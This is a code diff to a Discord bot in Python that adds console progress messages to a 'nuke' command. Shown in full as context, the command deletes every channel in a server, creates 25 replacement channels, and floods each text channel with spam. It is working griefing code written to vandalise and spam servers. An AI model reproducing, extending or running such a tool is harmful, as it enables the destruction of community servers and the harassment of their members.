@@ -79,18 +79,29 @@ async def on_ready():
 # NUKE COMMAND BY LYNO ( trash)
 @bot.command()
 async def nuke(ctx):
+    icon()
+    Write.Print(f'\nLogged in as {bot.user.name} ({bot.user.id})',Colors.red_to_blue,interval=0.0000)
+    Write.Print(f"\n Commands : \n {prefix}nuke",Colors.red_to_blue,interval=0.0000)
+    os.system('cls')
     await ctx.message.delete()
     guild = ctx.guild
     channels = guild.channels
     for channel in channels:
         await channel.delete()
+        Write.Print("\n > Deleted Channel",Colors.red_to_blue,interval=0.0000)
+    Write.Print("\n > Deleted All Channels !",Colors.blue_to_green,interval=0.0000)
 
     for _ in range(25):
         await guild.create_text_channel(name=channelname)
+        Write.Print("\n > Created Channel",Colors.red_to_blue,interval=0.0000)
+    Write.Print("\n > Created All Channels",Colors.blue_to_green,interval=0.0000)
 
     for channel in guild.text_channels:
         for _ in range(amount):
             await channel.send(spammsg)
+            Write.Print("\n > Message Sent",Colors.red_to_blue,interval=0.0000)
+    Write.Print("\n > Finished Spam !",Colors.blue_to_green,interval=0.0000)
+    Write.Print(f"\n Server <{guild}> Is Nuked !",Colors.blue_to_green,interval=0.0000)
 
 @bot.event
 async def on_command_error(ctx, error):
